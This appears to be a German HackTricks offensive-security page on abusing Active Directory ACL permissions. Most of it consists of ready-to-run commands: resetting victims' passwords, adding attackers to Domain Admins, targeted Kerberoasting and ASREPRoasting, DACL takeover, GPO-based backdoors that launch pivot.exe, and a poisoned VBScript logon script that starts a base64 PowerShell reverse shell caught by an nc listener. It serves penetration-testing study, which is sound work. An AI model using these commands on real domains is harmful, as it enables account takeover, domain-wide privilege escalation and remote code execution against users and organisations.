# Missbrauch von Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Diese Seite ist größtenteils eine Zusammenfassung der Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für mehr Details siehe die Originalartikel.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-Rechte auf Benutzer**

Dieses Privileg gewährt einem Angreifer vollständige Kontrolle über ein Ziel-Benutzerkonto. Sobald `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt sind, kann ein Angreifer:

- **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- Unter Linux kann man dasselbe über SAMR mit Samba `net rpc` durchführen:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Wenn das Konto deaktiviert ist, entferne das UAC-Flag**: `GenericAll` ermöglicht das Bearbeiten von `userAccountControl`. Unter Linux kann BloodyAD das `ACCOUNTDISABLE`-Flag entfernen:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Weisen Sie dem Benutzerkonto einen SPN zu, um es kerberoastable zu machen, und verwenden Sie dann Rubeus und targetedKerberoast.py, um die ticket-granting ticket (TGT)-Hashes zu extrahieren und zu versuchen, sie zu cracken.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deaktivieren Sie die Pre-Authentifizierung für den Benutzer, wodurch dessen Konto für ASREPRoasting anfällig wird.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Mit `GenericAll` auf einem Benutzer kannst du eine zertifikatbasierte Anmeldeinformation hinzufügen und dich als diesen authentifizieren, ohne dessen Passwort zu ändern. Siehe:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-Rechte für Gruppen**

Dieses Privileg erlaubt einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte an einer Gruppe wie `Domain Admins` besitzt. Nachdem er den distinguished name der Gruppe mit `Get-NetGroup` ermittelt hat, kann der Angreifer:

- **Sich selbst zur Domain Admins-Gruppe hinzufügen**: Dies kann über direkte Befehle oder durch die Verwendung von Modulen wie Active Directory oder PowerSploit erfolgen.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Von Linux aus kannst du auch BloodyAD verwenden, um dich selbst in beliebige Gruppen hinzuzufügen, wenn du über GenericAll/Write-Mitgliedschaft für diese verfügst. Wenn die Zielgruppe in “Remote Management Users” verschachtelt ist, erhältst du sofort WinRM-Zugriff auf Hosts, die diese Gruppe berücksichtigen:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Das Halten dieser Privilegien auf einem Computerobjekt oder einem Benutzerkonto ermöglicht:

- **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
- **Shadow Credentials**: Mit dieser Technik kann man einen Computer- oder Benutzeraccount imitieren, indem man die Rechte ausnutzt, um shadow credentials zu erstellen.

## **WriteProperty on Group**

Wenn ein Benutzer `WriteProperty`-Rechte auf alle Objekte einer bestimmten Gruppe (z. B. `Domain Admins`) hat, kann er:

- **Sich selbst zur Domain Admins-Gruppe hinzufügen**: Dies lässt sich durch Kombination der Befehle `net user` und `Add-NetGroupUser` erreichen; diese Methode ermöglicht eine Privilegieneskalation innerhalb der Domäne.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Dieses Privileg ermöglicht Angreifern, sich selbst zu bestimmten Gruppen hinzuzufügen, wie z. B. `Domain Admins`, mittels Befehlen, die die Gruppenmitgliedschaft direkt manipulieren. Mit der folgenden Befehlssequenz ist eine Selbsthinzufügung möglich:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ein ähnliches Privileg, das Angreifern erlaubt, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppenattribute ändern, sofern sie das Recht `WriteProperty` auf diesen Gruppen besitzen. Die Bestätigung und Ausführung dieses Privilegs erfolgen mit:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Der Besitz des `ExtendedRight` für einen Benutzer bezüglich `User-Force-Change-Password` ermöglicht Passwortzurücksetzungen, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung kann über PowerShell oder alternative Kommandozeilen-Tools erfolgen und bietet mehrere Methoden, das Passwort eines Benutzers zurückzusetzen, einschließlich interaktiver Sitzungen und One‑Liner für nicht-interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Nutzung von `rpcclient` unter Linux und zeigen die Vielseitigkeit der Angriffsvektoren.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Wenn ein Angreifer feststellt, dass er `WriteOwner`-Rechte auf eine Gruppe hat, kann er den Besitz der Gruppe auf sich selbst ändern. Dies ist besonders wirkungsvoll, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da die Änderung des Besitzers eine weiterreichende Kontrolle über Gruppenattribute und Mitgliedschaften ermöglicht. Der Vorgang umfasst das Identifizieren des korrekten Objekts mittels `Get-ObjectAcl` und anschließend die Verwendung von `Set-DomainObjectOwner`, um den Besitzer entweder über die SID oder den Namen zu ändern.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Diese Berechtigung erlaubt einem Angreifer, User-Eigenschaften zu verändern. Konkret kann der Angreifer mit `GenericWrite`-Zugriff den Pfad des Anmeldeskripts eines Users ändern, um bei der Anmeldung des Users ein bösartiges Skript auszuführen. Dies wird erreicht, indem der Befehl `Set-ADObject` verwendet wird, um die `scriptpath`-Eigenschaft des Ziel-Users so zu aktualisieren, dass sie auf das Skript des Angreifers zeigt.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, etwa indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Der Prozess beinhaltet das Erstellen eines credential object, die Verwendung dieses Objekts, um Benutzer zu einer Gruppe hinzuzufügen oder daraus zu entfernen, und das Überprüfen der Mitgliedschaftsänderungen mit PowerShell-Befehlen.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Unter Linux kann Samba `net` Mitglieder hinzufügen/entfernen, wenn man `GenericWrite` für die Gruppe hat (nützlich, wenn PowerShell/RSAT nicht verfügbar sind):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Das Besitzen eines AD-Objekts und das Vorhandensein von `WriteDACL`-Berechtigungen darauf ermöglichen es einem Angreifer, sich selbst `GenericAll`-Berechtigungen für das Objekt zu gewähren. Dies wird durch ADSI-Manipulation erreicht und erlaubt volle Kontrolle über das Objekt sowie die Möglichkeit, dessen Gruppenmitgliedschaften zu ändern. Dennoch gibt es Einschränkungen beim Versuch, diese Rechte mit den `Set-Acl` / `Get-Acl` Cmdlets des Active Directory-Moduls auszunutzen.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner schnelle Übernahme (PowerView)

Wenn Sie über `WriteOwner` und `WriteDacl` für ein Benutzer- oder Dienstkonto verfügen, können Sie die vollständige Kontrolle übernehmen und dessen Passwort mit PowerView zurücksetzen, ohne das alte Passwort zu kennen:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Hinweise:
- Möglicherweise müssen Sie zuerst den Besitzer auf sich selbst ändern, wenn Sie nur `WriteOwner` haben:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Zugriff mit beliebigem Protokoll (SMB/LDAP/RDP/WinRM) nach Zurücksetzen des Passworts prüfen.

## **Replikation in der Domain (DCSync)**

Der DCSync-Angriff nutzt spezifische Replikationsberechtigungen in der Domain, um einen Domain Controller zu imitieren und Daten, einschließlich Benutzeranmeldeinformationen, zu synchronisieren. Diese mächtige Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, die es Angreifern ermöglichen, sensible Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domain Controller zu haben. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO-Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-Delegation

Delegierter Zugriff zur Verwaltung von Group Policy Objects (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn beispielsweise einem Benutzer wie `offense\spotless` GPO-Verwaltungsrechte delegiert wurden, kann dieser Privilegien wie **WriteProperty**, **WriteDacl** und **WriteOwner** haben. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mit PowerView festgestellt werden kann: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO-Berechtigungen auflisten

Um fehlkonfigurierte GPOs zu identifizieren, können PowerSploit-cmdlets verkettet werden. Dadurch können GPOs entdeckt werden, die ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer, auf die die Richtlinie angewendet ist**: Es ist möglich zu ermitteln, auf welche Computer eine bestimmte GPO angewendet wird, um den Umfang der potenziellen Auswirkungen zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Auf einen bestimmten Computer angewendete Richtlinien**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, kann man Befehle wie `Get-DomainGPO` verwenden.

**OUs, auf die eine Richtlinie angewendet ist**: Die Identifikation von Organizational Units (OUs), die von einer bestimmten Richtlinie betroffen sind, kann mit `Get-DomainOU` erfolgen.

Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs zu enumerieren und Probleme darin zu finden.

### Missbrauch von GPO - New-GPOImmediateTask

Fehlkonfigurierte GPOs können ausgenutzt werden, um Code auszuführen, zum Beispiel durch das Erstellen einer sofortigen geplanten Aufgabe. Damit kann ein Benutzer zur lokalen Administratorgruppe betroffener Maschinen hinzugefügt werden, was die Privilegien erheblich erhöht:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Das GroupPolicy module, falls installiert, ermöglicht die Erstellung und Verknüpfung neuer GPOs sowie das Setzen von Einstellungen wie registry values, um backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass das GPO aktualisiert wird und sich ein Benutzer am Computer anmeldet, damit die Ausführung erfolgt:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse bietet eine Methode, bestehende GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Änderung bestehender GPOs oder die Verwendung von RSAT-Tools, um neue zu erstellen, bevor Änderungen angewendet werden:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Richtlinienaktualisierung erzwingen

GPO-Updates erfolgen in der Regel ungefähr alle 90 Minuten. Um diesen Prozess zu beschleunigen, besonders nach einer Änderung, kann auf dem Zielcomputer der Befehl `gpupdate /force` verwendet werden, um eine sofortige Richtlinienaktualisierung zu erzwingen. Dieser Befehl stellt sicher, dass Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus zu warten.

### Technischer Hintergrund

Bei der Inspektion der Scheduled Tasks für ein bestimmtes GPO, wie die `Misconfigured Policy`, lässt sich feststellen, dass Tasks wie `evilTask` hinzugefügt wurden. Diese Tasks werden über Skripte oder Kommandozeilentools erstellt, die darauf abzielen, Systemverhalten zu ändern oder Privilegien zu eskalieren.

Die Struktur des Tasks, wie sie in der XML-Konfigurationsdatei gezeigt ist, die durch `New-GPOImmediateTask` erzeugt wurde, beschreibt die Einzelheiten des geplanten Tasks – einschließlich des auszuführenden Befehls und seiner Trigger. Diese Datei zeigt, wie Scheduled Tasks innerhalb von GPOs definiert und verwaltet werden und liefert eine Methode, beliebige Befehle oder Skripte im Rahmen der Durchsetzung von Richtlinien auszuführen.

### Benutzer und Gruppen

GPOs erlauben auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch direkte Bearbeitung der Users and Groups policy files können Angreifer Benutzer zu privilegierten Gruppen hinzufügen, wie z. B. der lokalen `administrators`-Gruppe. Dies ist durch die Delegation von GPO-Managementberechtigungen möglich, die das Ändern von Policy-Dateien erlaubt, um neue Benutzer aufzunehmen oder Gruppenmitgliedschaften zu ändern.

Die XML-Konfigurationsdatei für Users and Groups zeigt, wie diese Änderungen umgesetzt werden. Durch Hinzufügen von Einträgen in dieser Datei können bestimmte Benutzer auf betroffenen Systemen erhöhte Rechte erhalten. Diese Methode bietet einen direkten Weg zur Privilegieneskalation durch GPO-Manipulation.

Außerdem können weitere Methoden zur Codeausführung oder zum Aufrechterhalten von Persistenz in Betracht gezogen werden, wie die Nutzung von logon/logoff-Skripten, das Ändern von Registry-Keys für Autoruns, die Installation von Software über .msi-Dateien oder das Bearbeiten von Service-Konfigurationen. Diese Techniken bieten verschiedene Wege, um über den Missbrauch von GPOs Zugriff zu behalten und Zielsysteme zu kontrollieren.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Logon-Skripte lokalisieren
- Überprüfe Benutzerattribute auf ein konfiguriertes Logon-Skript:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Domain-Freigaben durchsuchen, um Verknüpfungen oder Verweise auf Skripte aufzudecken:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Parsen von `.lnk`-Dateien, um Ziele aufzulösen, die auf SYSVOL/NETLOGON verweisen (nützlicher DFIR-Trick und für Angreifer ohne direkten GPO-Zugriff):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound zeigt das Attribut `logonScript` (scriptPath) auf Benutzerknoten an, wenn es vorhanden ist.

### Schreibzugriff validieren (don’t trust share listings)
Automatisierte Tools können SYSVOL/NETLOGON als schreibgeschützt anzeigen, aber zugrundeliegende NTFS ACLs können dennoch Schreibzugriff erlauben. Immer testen:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Wenn sich Dateigröße oder mtime ändern, haben Sie Schreibzugriff. Sichern Sie die Originale, bevor Sie Änderungen vornehmen.

### Poison a VBScript logon script for RCE
Fügen Sie einen Befehl hinzu, der eine PowerShell reverse shell startet (von revshells.com generieren), und behalten Sie die ursprüngliche Logik bei, um Geschäftsabläufe nicht zu beeinträchtigen:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Auf Ihrem Host lauschen und auf den nächsten interaktiven logon warten:
```bash
rlwrap -cAr nc -lnvp 443
```
Hinweise:
- Die Ausführung erfolgt unter dem Token des angemeldeten Benutzers (nicht SYSTEM). Der Geltungsbereich ist der GPO-Link (OU, site, domain), der dieses Skript anwendet.
- Bereinigen: Stelle nach der Nutzung den ursprünglichen Inhalt und die Zeitstempel wieder her.

## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
